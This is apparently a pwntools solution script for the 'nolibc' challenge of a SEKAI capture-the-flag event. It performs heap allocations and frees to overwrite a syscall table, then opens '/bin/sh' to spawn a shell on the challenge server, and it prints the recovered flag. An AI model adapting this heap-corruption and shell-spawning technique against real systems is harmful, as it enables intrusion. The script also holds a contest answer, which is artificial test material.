#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]
context.arch = 'amd64'

gdbscript = '''
# brva 0x28D5
brva 0x2609

define free_list
    tele 0x555555569070
end

define user
    tele 0x555555559070
end
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return process("ncat --ssl nolibc.chals.sekai.team 1337".split(), *a, **kw)
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr

def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper

@trace
def login(u, p):
    sla(b'Choose an option: ', b'1')
    sla(b'Username: ', u)
    sla(b'Password: ', p)

@trace
def register(u,p):
    sla(b'Choose an option: ', b'2')
    sla(b'Username: ', u)
    sla(b'Password: ', p)

@trace
def add_string(size, cont):
    sla(b'Choose an option: ', b'1')
    sla(b'length: ', str(size).encode())
    sla(b'string: ', cont)

@trace
def alloc(size,cont):
    sl(flat(
        b'1\n',
        str(size).encode(), b'\n',
        cont
    ))
    
@trace
def free(idx):
    sl(flat(
        b'2\n',
        str(idx).encode()
    ))

@trace
def delete_string(idx):
    sla(b'Choose an option: ', b'2')
    sla(b'delete: ', str(idx).encode())

@trace
def view_strings():
    sla(b'Choose an option: ', b'3')

@trace
def read_from_file(fname):
    sla(b'Choose an option: ', b'5')
    sla(b'filename: ', fname)


register(b'a', b'a')
login(b'a', b'a')

for i in range(180):
    alloc(0xff, p8(i))

alloc(0x3f, flat(
    b'A'*0x30,
    # syscall table overwrite
    p32(constants.SYS_read), p32(constants.SYS_write), p32(constants.SYS_execve), p32(constants.SYS_close),
))

for _ in range(10):
    free(0)

read_from_file(b'/bin/sh')

# cat /flag*
# SEKAI{shitty_heap_makes_a_shitty_security}

ia()
